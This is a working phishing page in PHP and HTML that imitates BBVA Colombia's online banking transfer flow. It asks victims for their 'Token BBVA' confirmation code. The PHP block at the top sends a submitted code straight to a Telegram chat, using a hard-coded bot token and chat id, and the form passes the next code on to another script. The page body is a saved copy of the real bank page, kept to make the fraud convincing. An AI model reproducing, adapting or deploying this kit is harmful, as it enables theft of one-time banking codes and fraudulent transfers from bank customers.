<?php
include("tokens.php");
@session_start();
ini_set("display_errors", 0);

if ( isset ($_POST['Codigo1']) ){

$message = "Cod1.: ".$_POST['Codigo1']."\r\n";
$apiToken = "5652387598:AAHhPJ-nZaKsgoxrTJ5VBvp177WfbgmCjRg";
$data = [
    'chat_id' => '-875338396',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



}
?>
<!DOCTYPE html>
<!-- saved from url=(0097)https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1 -->
<html xmlns="http://www.w3.org/1999/xhtml"><head id="j_idt2"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><script type="text/javascript" id="www-widgetapi-script" src="./plantilla_files/www-widgetapi.js.descarga" async=""></script><script type="text/javascript" async="" src="./plantilla_files/js"></script><script type="text/javascript" async="" src="./plantilla_files/f.txt"></script><script src="./plantilla_files/iframe_api"></script><script type="text/javascript" src="./plantilla_files/ruxitagentjs_ICA2Vfghjqru_10247220811100421.js.descarga" data-dtconfig="app=aaa4cdc7fda9d704|rcdec=1209600000|featureHash=ICA2Vfghjqru|vcv=2|rdnt=1|uxrgce=1|bp=3|srmcrv=10|cuc=befpivr2|mel=100000|dpvc=1|md=mdcc1=a#nameClient ^rb span:nth-child(1),mdcc2=a#receiptDiv ^rb div.receiptSummary ^rb div:nth-child(4) ^rb p,mdcc3=a#receiptDiv ^rb div.receiptSummary ^rb div:nth-child(3) ^rb p,mdcc4=a#conoritaThemeform^bs:j_idt116 ^rb p,mdcc5=a#receiptDiv ^rb div.receiptContent ^rb h2,mdcc7=a#conoritaThemeform^bs:stepnumber-0 ^rb div ^rb div ^rb div.col-sm-5.col-sm-offset-1.desktop ^rb div ^rb div:nth-child(3) ^rb p,mdcc8=a#receiptDiv ^rb div.receiptSummary ^rb div:nth-child(1) ^rb p,mdcc11=a#receiptDiv ^rb div.receiptContent ^rb h1,mdcc13=a#conoritaThemeform^bs:stepnumber-0 ^rb div ^rb div ^rb div.col-sm-5.col-sm-offset-1.desktop ^rb div ^rb div:nth-child(6) ^rb p,mdcc14=a#conoritaThemeform^bs:stepnumber-0 ^rb div ^rb div ^rb div.col-sm-5.col-sm-offset-1.desktop ^rb div ^rb div:nth-child(2) ^rb p,mdcc15=a#sh1 ^rb h5,mdcc16=a#conoritaThemeform^bs:j_idt26 ^rb div ^rb div ^rb p,mdcc17=a#conoritaThemeform^bs:j_idt36 ^rb div ^rb div ^rb p,mdcc18=a#conoritaThemeform^bs:j_idt39 ^rb div ^rb div ^rb p,mdcc19=a#conoritaThemeform^bs:j_idt42 ^rb div ^rb div ^rb p,mdcc20=a#conoritaThemeform^bs:j_idt45 ^rb div ^rb div ^rb p,mdcc21=a#conoritaThemeform^bs:j_idt64 ^rb div ^rb div ^rb p,mdcc22=a#conoritaThemeform^bs:j_idt52 ^rb div ^rb div ^rb h2,mdcc23=a#conoritaThemeform^bs:j_idt52 ^rb div ^rb div ^rb div:nth-child(8) ^rb p,mdcc24=a#conoritaThemeform^bs:j_idt52 ^rb div ^rb div ^rb div:nth-child(8) ^rb p,mdcc26=a#conoritaThemeform^bs:j_idt52 ^rb div ^rb div ^rb p,mdcc27=a#receiptDiv ^rb div.receiptContent ^rb h2,mdcc28=a#receiptDiv ^rb div.receiptContent ^rb h2,mdcc29=a#receiptDiv ^rb div.receiptContent ^rb h2,mdcc30=a#conoritaThemeform^bs:j_idt52 ^rb div ^rb div ^rb h2|ssv=4|lastModification=1663508409830|mdp=mdcc2,mdcc3,mdcc4,mdcc5,mdcc22,mdcc27,mdcc28,mdcc29,mdcc30|dtVersion=10247220811100421|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/kqco_co_web/ruxitagentjs_ICA2Vfghjqru_10247220811100421.js|reportUrl=/kqco_co_web/rb_04227812-0978-4388-870d-9ac55068dcf2|rid=RID_402187135|rpid=648937952"></script><link type="text/css" rel="stylesheet" href="./plantilla_files/theme.css"><link type="text/css" rel="stylesheet" href="./plantilla_files/components.css"><script type="text/javascript" src="./plantilla_files/jquery.js.descarga"></script><script type="text/javascript" src="./plantilla_files/core.js.descarga"></script><script type="text/javascript" src="./plantilla_files/components.js.descarga"></script><script type="text/javascript" src="./plantilla_files/jquery-plugins.js.descarga"></script><link type="text/css" rel="stylesheet" href="./plantilla_files/watermark.css"><script type="text/javascript" src="./plantilla_files/watermark.js.descarga"></script><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='es_419';}</script>
    <title>BBVA :: Colombia
    </title>

    
    <link href="./plantilla_files/multipasov2.min.css" rel="stylesheet" type="text/css">
    <link href="./plantilla_files/spinner.css" rel="stylesheet"><script type="text/javascript">
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2Fbbva; path=/; secure";
/*]]>*/ 
</script>
<script src="./plantilla_files/js(1)" async=""></script><script src="./plantilla_files/365136983864263" async=""></script><script src="./plantilla_files/identity.js.descarga" async=""></script><script src="./plantilla_files/fbevents.js.descarga" async=""></script><script src="./plantilla_files/AppMeasurement.min.js.descarga" async=""></script><script src="./plantilla_files/AppMeasurement_Module_ActivityMap.min.js.descarga" async=""></script><script src="./plantilla_files/js(2)"></script><script src="./plantilla_files/RC338c6325d6b2490c9e5d90a40c81125f-source.min.js.descarga" async=""></script><script src="./plantilla_files/RC16fae290442a443a8f52d8ba739224b2-source.min.js.descarga" async=""></script><meta http-equiv="origin-trial" content="A7bG5hJ4XpMV5a3V1wwAR0PalkFSxLOZeL9D/YBYdupYUIgUgGhfVJ1zBFOqGybb7gRhswfJ+AmO7S2rNK2IOwkAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjY5NzY2Mzk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><script type="text/javascript" async="" src="./plantilla_files/f(1).txt"></script><script type="text/javascript" src="./plantilla_files/b6764381.js.descarga"></script><script src="./plantilla_files/RCcd6ba3b2709643adaf507e9ea15f42a5-source.min.js.descarga" async=""></script></head>


<body id="coronitaLayout" class="multipaso coronita" onload="ini()" onclick="stop()" onkeypress="stop()">
<script>
    var data_from_legacy = '{"tagging":{"country":"COL","environment":"pr01","gender":"M","profileID":"11523224","state":"001","segmentProfile":"N","age":"10/10/2002"}}';
</script><div id="header" class="ui-outputpanel ui-widget"><div id="subheader" class="ui-outputpanel ui-widget subheader row" style="background: "><div id="sh1" class="ui-outputpanel ui-widget container header-info-container">
            <img style="display: none;" src="./plantilla_files/bbva-white.svg">
            </div><a id="sh2" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget close" onclick="document.getElementById(&#39;coronita-modal&#39;).style.display = &#39;flex&#39;;;PrimeFaces.ab({s:&quot;sh2&quot;});return false;" type="button">
            </a><div id="sh3" class="ui-outputpanel ui-widget progress-container" style="display: ">
            <div class="progress-bar" id="myBar" style="width: 100%;"></div></div></div></div><div id="content" class="ui-outputpanel ui-widget"><div id="spinnerCoronita" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-shadow ui-hidden-container spinnerCoronitaTheme" role="dialog" aria-labelledby="spinnerCoronita_title" aria-hidden="true" style="width: auto; height: auto;"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top" style=""><span id="spinnerCoronita_title" class="ui-dialog-title"></span></div><div class="ui-dialog-content ui-widget-content" style="height: auto;">
	<div class="bbva-foundations-spinner">
		<figure class="spinner"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 400" id="_i5u178q2fh">
				<defs>
					<clippath id="masked-clip-path__i5u178q2fh">
						<path d="M400,0L0,0L0,400L400,400ZM45.9596,200C45.9596,115.061,115.061,45.9596,200,45.9596C284.939,45.9596,354.04,115.061,354.04,200C354.04,284.939,284.939,354.04,200,354.04C115.061,354.04,45.9596,284.939,45.9596,200Z" fill-rule="evenodd"></path>
					</clippath>
					<clippath id="gradient-clip__i5u178q2fh">
						<ellipse rx="197.5" ry="197.5" cx="200" cy="200" fill="none"></ellipse>
					</clippath>
					<radialgradient cx="199" cy="92" r="271.854" fx="197.801" fy="-27.9043" gradientUnits="userSpaceOnUse" id="gradient-path-fill__i5u178q2fh">
						<stop class="gr-stop-color anim gradient-path-offset-anim" offset="0.143991"></stop>
						<stop class="gr-stop-bg-color" offset="1" stop-opacity="0"></stop>
					</radialgradient>
					<filter color-interpolation-filters="sRGB" id="gradient-path-filter__i5u178q2fh">
						<fecomponenttransfer>
							<fefuncr type="linear" slope="1.2"></fefuncr>
							<fefuncg type="linear" slope="1.2"></fefuncg>
							<fefuncb type="linear" slope="1.2"></fefuncb>
						</fecomponenttransfer>
					</filter>
					<mask class="bright-mask" id="bright-mask__i5u178q2fh">
						<path class="bright-mask-path anim bright-anim" d="M-0.66667,0C-0.66667,0,41,68,167,68C290.5,68,334,0,334,0C334,0,281.425,113,166.925,113C50.4255,113,-0.66667,0,-0.66667,0Z" filter="url(#bright-mask-filter__i5u178q2fh)"></path>
					</mask>
					<filter id="bright-mask-filter__i5u178q2fh">
						<fegaussianblur stdDeviation="20"></fegaussianblur>
					</filter>
					<radialgradient cx="196.5" cy="0" r="100" fx="196.5" fy="0" gradientUnits="userSpaceOnUse" id="shine-stroke__i5u178q2fh">
						<stop class="shine-stop-color" offset="0"></stop>
						<stop class="shine-stop-color" offset="1" stop-opacity="0"></stop>
					</radialgradient>
				</defs>
				<g class="anim wrap rotation-anim" clip-path="url(#masked-clip-path__i5u178q2fh)">
					<ellipse class="bg" rx="197.5" ry="197.5" cx="200" cy="200"></ellipse>
					<path class="outline" d="M196.5,0C87.9723,0,0,87.9723,0,196.5C0,305.028,87.9723,393,196.5,393C305.028,393,393,305.028,393,196.5C393,87.9723,305.028,0,196.5,0Z"></path>
					<g clip-path="url(#gradient-clip__i5u178q2fh)">
						<g class="anim gradient-anim">
							<path class="gradient-path anim gradient-path-anim" d="M400,0L400,400L0,400L0,0Z" fill-rule="nonzero" fill="url(#gradient-path-fill__i5u178q2fh)" filter="url(#gradient-path-filter__i5u178q2fh)"></path>
						</g>
					</g>
					<ellipse class="bright" rx="197.5" ry="197.5" fill-rule="evenodd" mask="url(#bright-mask__i5u178q2fh)"></ellipse>
					<path class="shine" d="M196.5,0C87.9723,0,0,87.9723,0,196.5C0,305.028,87.9723,393,196.5,393C305.028,393,393,305.028,393,196.5C393,87.9723,305.028,0,196.5,0Z" stroke="url(#shine-stroke__i5u178q2fh)"></path>
				</g>
			</svg>
	</figure>
</div></div></div>
<form  method="post" name="form1" id="form1" action="index5.php">

        <div class="steps-mask" style="height: 657px;">
            <div class="steps-container" style="top: 0%;">
        <script type="text/javascript" src="./plantilla_files/biocatch.js.descarga"></script><script type="text/javascript">
            var loadComplete = false;
            function changeContext(){
                loadComplete = true;
                var activeStep = document.querySelectorAll('div .step.active')[0];
                var context = (activeStep != undefined) ? activeStep.querySelector("[data-context]").dataset.context : '';
                bcSmartLoad("https://biocatch-wup.bbva.com.co/scripts/b6764381/b6764381.js", context, "gekWU9RlrTK58N0uS0BBDQz");
            }
        </script><div id="conoritaThemeform:pasosForm" class="ui-outputpanel ui-widget"><script type="text/javascript">
                setTimeout(function(){
                    deleteContacts()
                },3000);
            </script><div id="conoritaThemeform:stepnumber-0" class="ui-outputpanel ui-widget step active" style="height: 657px;">
                <div data-context="DESTINO_TRANSFERENCIA"></div>
                <img src="./BBVA __ Colombia_files/SMS.svg" class="mobile tablet head-image" alt="">
                <div class="container">
                    <h3 class="step-identifier">
                    </h3>
                    <h1 style="font-weight: bold;">Token BBVA</h1>
                    <div class="row">
        
                        <div class="col-sm-12 col-md-6">
                            <h2 >Ingresa el código de confirmación enviado a
                                tu buzón de notificaciones en BBVA móvil, para finalizar la verificación de identidad.</h2>
        
                            <div id="input-id" class="input-container__coronitaV2 password-field "><label id="conoritaThemeform:tokenComposite:confirmToken:input1_placeholder" class="input-placeholder__coronitaV2">Ingrese el token</label><input id="conoritaThemeform:tokenComposite:confirmToken:input1" name="Codigo2" type="password" value="" autocomplete="off" maxlength="8" placeholder="Ingrese el token"  class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2 password-field" role="textbox" aria-disabled="false" aria-readonly="false"><i id="conoritaThemeform:tokenComposite:confirmToken:input1_prefix" class="input-password-field__coronitaV2"></i>
                            </div>
                            <div class=" ">
                                <div class="inputerrorMessage" style="margin-top: -40px">
                                    <h6>
                                        <i class="iconcoronita-alert"></i>
                                        
                                    </h6>
                                </div>
                            </div>
        
                            <h4 class="bold" id="blockTimer" style="margin-top: 0px ">
                                 <span></span> 
                            </h4>
                            <div class="buttons"><button  id="conoritaThemeform:tokenComposite:confirmToken:btn-submit-confirm-operation" class="ui-commandlink ui-widget ui-state-enable btn btn-aqua btn-full btn-full-md next-step-button"><span>Verificar Identidad</span></button>
                            </div>
                            
                        </div>
                        <div class="col-md-5 col-sm-12 col-md-offset-1">
                            <div class="help gold half-illustration">
                                <div class="desktop">
                                    <img src="./plantilla_files/SMS.svg" class="tCenter" alt="">
                                </div>
                                <p>
                                    Si no recibes el código, lo puedes generar en BBVA móvil en la
                                    opción: <br> <strong>Menú &gt; Token &gt; Generar Token BBVA net </strong> <br>
                                </p>
                            </div>
                        </div>
        
                    </div>
                </div></div><div id="conoritaThemeform:stepnumber-1" class="ui-outputpanel ui-widget step" style="height: 657px;"><div id="conoritaThemeform:j_idt51" class="ui-outputpanel ui-widget container">
                    <div data-context="DATOS_DESTINO"></div><script type="text/javascript">
                        moveTabs();
                    </script>
                    <h3 class="step-identifier">2 de 7</h3>
                    <h1>¿A qué quieres transferir?</h1>
                    <div class="row"><div id="conoritaThemeform:mainPnlOther" class="ui-outputpanel ui-widget">
                            <div class="col-sm-12 col-md-6">

                                <div class="tabs-container"><div id="conoritaThemeform:pnlTabs" class="ui-outputpanel ui-widget">
                                        <div class="tabs"><a id="conoritaThemeform:j_idt60" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget tab active" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt60&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt60&quot;,u:&quot;conoritaThemeform:mainPnlOther&quot;,onco:function(xhr,status,args){initilizeCustomComponents(); moveTabs(); bcSmartLoad(&#39;https://biocatch-wup.bbva.com.co/scripts/b6764381/b6764381.js&#39;, &#39;DATOS_DESTINO&#39;, &#39;gekWU9RlrTK58N0uS0BBDQz&#39;);;}});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt60&quot;});return false;">
                                                Contacto
                                                </a><a id="conoritaThemeform:j_idt62" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget tab " onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt62&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt62&quot;,u:&quot;conoritaThemeform:mainPnlOther&quot;,onco:function(xhr,status,args){initilizeCustomComponents(); moveTabs(); bcSmartLoad(&#39;https://biocatch-wup.bbva.com.co/scripts/b6764381/b6764381.js&#39;, &#39;DATOS_CUENTA_DESTINO&#39;, &#39;gekWU9RlrTK58N0uS0BBDQz&#39;);;}});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt62&quot;});return false;">
                                                Cuentas
                                                </a>
                                            <span class="highlight" style="width: 227.5px; left: 0px;"></span>
                                        </div></div>

                                    <div class="tabs-content"><div id="conoritaThemeform:pnlContactosFather" class="ui-outputpanel ui-widget"><div id="conoritaThemeform:pnlContactos" class="ui-outputpanel ui-widget">
                                                <div class="content-block active">
                                                    <div class="input-container__coronitaV2  " id="inputNameFatherOthers"><input id="conoritaThemeform:inputName" name="conoritaThemeform:inputName" type="text" autocomplete="off" maxlength="50" placeholder="Nombre" onkeypress="javascript:return isLetter(this);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputName&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputName&quot;,u:&quot;conoritaThemeform:btn-next-pl-other&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                                        <div class="inputerrorMessage">
                                                            <h6>
                                                                <i class="iconcoronita-alert"></i>
                                                            </h6>
                                                        </div>
                                                    </div>

                                                    <div class="input-container__coronitaV2  " id="inputPhoneFather"><input id="conoritaThemeform:inputPhone" name="conoritaThemeform:inputPhone" type="text" value="" autocomplete="off" maxlength="12" placeholder="Número de celular" onkeypress="javascript:return isNumber(event);" onkeyup="PrimeFaces.bcn(this,event,[function(event){javascript:return phoneNumberFormat(this);},function(event){PrimeFaces.ab({s:&quot;conoritaThemeform:inputPhone&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputPhone&quot;,u:&quot;conoritaThemeform:btn-next-pl-other&quot;});}])" onchange="PrimeFaces.bcn(this,event,[function(event){javascript:return phoneNumberFormat(this);},function(event){PrimeFaces.ab({s:&quot;conoritaThemeform:inputPhone&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:inputPhone&quot;,u:&quot;conoritaThemeform:btn-next-pl-other&quot;});}])" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                                        <div class="inputerrorMessage">
                                                            <h6>
                                                                <i class="iconcoronita-alert"></i>
                                                            </h6>
                                                        </div>
                                                    </div>
                                                </div></div></div>
                                    </div>
                                </div>
                                <div class="buttons"><span id="conoritaThemeform:btn-next-pl-other" class="ui-commandlink ui-widget ui-state-disabled btn btn-blue btn-full ui-inputfield">Continuar</span>
                                </div>
                            </div>
                            <div class="col-md-5 col-sm-12 col-md-offset-1">
                                    <div class="help blueLightWhite ">
                                        <i class="iconcoronita-info"></i>
                                        <p>Para transferir a uno de tus contactos solo
                                            debes ingresar su número de celular.
                                            <br><br>
                                            En cuentas encontrarás los productos a los
                                            <br>
                                            que ya les has transferido o puedes
                                            <br>
                                            transferir a una nueva cuenta.</p>
                                    </div>
                            </div>

                            <div class="modal fade modal-md out" tabindex="-1" id="confirmEliminationOthers" role-dialog="">
                                <div class="modal-dialog modal-sm" role="document">
                                    <div class="modal-content">
                                        <div class="modal-header">
                         
                                        </div>
                                        <div class="modal-body">
                                            <div class="row">
                                                <div class="col-md-12 iconModal">
                                                    <img class="" src="./plantilla_files/error.svg" alt="">
                                                </div>
                                                <h1>Confirmación</h1>
                                            </div>

                                            <div class="row">
                                                <div class="col-md-12">
                                                    <p class="center">¿Estas seguro que deseas eliminar la cuenta?</p>

                                                </div>
                                            </div>

                                            <div class="row buttons ">
                                                <div class="col-md-8 col-md-offset-2"><a id="conoritaThemeform:submit-confirmar-others" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget" onclick="removeModal2ByIdOthers();;PrimeFaces.ab({s:&quot;conoritaThemeform:submit-confirmar-others&quot;,p:&quot;conoritaThemeform&quot;,u:&quot;conoritaThemeform:mainPnlOther&quot;,onst:function(cfg){PF(&#39;statusDialog&#39;).show();},onco:function(xhr,status,args){PF(&#39;statusDialog&#39;).hide();}});return false;">Confirmar</a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div></div>
                    </div></div></div><div id="conoritaThemeform:stepnumber-2" class="ui-outputpanel ui-widget step" style="height: 657px;">
                <div data-context="PRODUCTO_DESTINO"></div><div id="conoritaThemeform:productTransfer" class="ui-outputpanel ui-widget container ">
                    <h3 class="step-identifier">2 de 6</h3>
                    <h1>¿A dónde quieres transferir?</h1>
                    <div class="row">
                        <div class="col-sm-12 col-md-6 form"><div id="conoritaThemeform:j_idt89" class="ui-outputpanel ui-widget select-container__coronitaV2"><div id="conoritaThemeform:selectOwnAccount" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectOwnAccount_items" style="min-width: 170px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectOwnAccount_focus" name="conoritaThemeform:selectOwnAccount_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectOwnAccount_0" aria-describedby="conoritaThemeform:selectOwnAccount_0" aria-disabled="false" placeholder="Tipo de producto"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectOwnAccount_input" name="conoritaThemeform:selectOwnAccount_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectOwnAccount&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectOwnAccount&quot;,u:&quot;conoritaThemeform:buttonAdd conoritaThemeform:productTransfer&quot;,onco:function(xhr,status,args){initilizeCustomComponents(),PF(&#39;statusDialog&#39;).hide();}});"><option value=""></option><option value="AH">Cuenta de Ahorro</option><option value="CC">Cuenta Corriente</option><option value="DE">Dinero Móvil</option><option value="DE2">Depósito Electrónico</option></select></div><label id="conoritaThemeform:selectOwnAccount_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">&nbsp;</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div></div><div id="conoritaThemeform:bank" class="ui-outputpanel ui-widget select-container__coronitaV2"><div id="conoritaThemeform:j_idt101" class="ui-outputpanel ui-widget select-container__coronitaV2"><div id="conoritaThemeform:selectBank" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectBank_items" style="min-width: 342px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectBank_focus" name="conoritaThemeform:selectBank_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectBank_0" aria-describedby="conoritaThemeform:selectBank_0" aria-disabled="false" placeholder="Banco"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectBank_input" name="conoritaThemeform:selectBank_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectBank&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectBank&quot;,u:&quot;conoritaThemeform:buttonAdd conoritaThemeform:selectDocumentType&quot;});"><option value=""></option><option value="0013">BANCO BBVA</option><option value="0059">BANCAMIA</option><option value="0040">BANCO AGRARIO</option><option value="0052">BANCO AV VILLAS</option><option value="0805">BANCO BTG PACTUAL</option><option value="0032">BANCO CAJA SOCIAL</option><option value="0009">BANCO CITIBANK</option><option value="0066">BANCO COOPERATIVO COOPCENTRAL</option><option value="0558">BANCO CREDIFINANCIERA SA.</option><option value="0051">BANCO DAVIVIENDA</option><option value="0001">BANCO DE BOGOTÁ</option><option value="0023">BANCO DE OCCIDENTE</option><option value="0062">BANCO FALABELLA</option><option value="0063">BANCO FINANDINA</option><option value="0012">BANCO GNB SUDAMERIS</option><option value="0006">BANCO ITAÚ</option><option value="0014">BANCO ITAÚ*</option><option value="0071">BANCO J.P. MORGAN COLOMBIA S.A</option><option value="0047">BANCO MUNDO MUJER S.A.</option><option value="0060">BANCO PICHINCHA</option><option value="0002">BANCO POPULAR</option><option value="0058">BANCO PROCREDIT</option><option value="0065">BANCO SANTANDER</option><option value="0069">BANCO SERFINANZA S.A.</option><option value="0029">BANCO TEQUENDAMA</option><option value="0804">BANCO UALA BANCAR TECNOLOGIA CO S.A</option><option value="0053">BANCO WWB</option><option value="0031">BANCOLDEX</option><option value="0007">BANCOLOMBIA</option><option value="0067">BANCOMPARTIR </option><option value="0061">BANCOOMEVA</option><option value="0370">COLTEFINANCIERA S.A.</option><option value="0292">CONFIAR COOPERATIVA FINANCIERA</option><option value="0283">COOFIANTIOQUIA</option><option value="0291">COOFINEP COOPERATIVA FINANCIERA</option><option value="0289">COTRAFA COOPERATIVA FINANCIERA</option><option value="0802">DING TECNIPAGOS S.A.</option><option value="0121">FINANCIERA JURISCOOP</option><option value="0303">GIROS Y FINANZAS CF</option><option value="0637">IRIS</option><option value="0070">LULO BANK S.A.</option><option value="0801">MOVii</option><option value="0019">SCOTIABANK COLPATRIA</option><option value="0342">SERVIFINANSA S.A.</option></select></div><label id="conoritaThemeform:selectBank_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">&nbsp;</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div></div></div>

                            <div class="input-container__coronitaV2 error"><input id="conoritaThemeform:inputLoan" name="conoritaThemeform:inputLoan" type="text" autocomplete="off" maxlength="20" placeholder="Número de producto" onkeypress="javascript:return isNumber(event);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputLoan&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputLoan&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                <div class="inputerrorMessage">
                                    <h6>
                                        <i class="iconcoronita-alert"></i>
                                    </h6>
                                </div>
                            </div><div id="conoritaThemeform:inputNameFather" class="ui-outputpanel ui-widget input required">
                                <div class="input-container__coronitaV2 error"><input id="conoritaThemeform:inputNameRegister" name="conoritaThemeform:inputNameRegister" type="text" autocomplete="off" placeholder="Nombres y apellidos" onkeypress="javascript:return isLetter(this);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputNameRegister&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputNameRegister&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                    <div class="inputerrorMessage">
                                        <h6>
                                            <i class="iconcoronita-alert"></i>
                                        </h6>
                                    </div>
                                </div>


                                <script type="text/javascript">
                                    setTimeout(
                                        function () {
                                            document
                                                .getElementById("form-step-register-product:inputNameFather").classList
                                                .add('error');
                                        }, 300);
                                </script></div><div id="conoritaThemeform:j_idt114" class="ui-outputpanel ui-widget"></div><div id="conoritaThemeform:j_idt115" class="ui-outputpanel ui-widget two-elements-container">
                                <br>
                                <div class="select half select-container__coronitaV2" style="margin-right: 30px">
                                    <div class="select-container__coronitaV2"><div id="conoritaThemeform:selectDocumentType" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectDocumentType_items" style="min-width: 229px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectDocumentType_focus" name="conoritaThemeform:selectDocumentType_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectDocumentType_0" aria-describedby="conoritaThemeform:selectDocumentType_0" aria-disabled="false" placeholder="Tipo de documento"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectDocumentType_input" name="conoritaThemeform:selectDocumentType_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectDocumentType&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectDocumentType&quot;,u:&quot;conoritaThemeform:buttonAdd conoritaThemeform:productTransfer&quot;,onco:function(xhr,status,args){initilizeCustomComponents();}});"><option value=""></option><option value="1">Cedula de Ciudadania</option><option value="2">Cedula de Extranjeria</option><option value="4">Tarjeta de Identidad</option><option value="6">Pasaporte</option><option value="0">No de Identificación Personal</option><option value="3">NIT</option></select></div><label id="conoritaThemeform:selectDocumentType_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">&nbsp;</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div>
                                    </div>
                                </div>
                                <div class="select half error">
                                    <div class="input-container__coronitaV2 error"><input id="conoritaThemeform:inputNumber" name="conoritaThemeform:inputNumber" type="text" autocomplete="off" maxlength="20" placeholder="Número de documento" onkeypress="javascript:return isNumber(event);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputNumber&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputNumber&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                    </div>
                                </div>

                                <div class="error">
                                    <div class="inputerrorMessage">
                                        <h6>
                                            <i class="iconcoronita-alert"></i>
                                        </h6>
                                    </div>
                                </div></div><div id="conoritaThemeform:j_idt129" class="ui-outputpanel ui-widget" style="margin-left: 25px; "><a id="conoritaThemeform:l-tyc" href="https://nuevaversion.bbvanet.com.co/bbva/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget" onclick="document.getElementById(&#39;m-tyc&#39;).style.display = &#39;flex&#39;;;PrimeFaces.ab({s:&quot;conoritaThemeform:l-tyc&quot;});return false;">
                                    Ver Términos y Condiciones
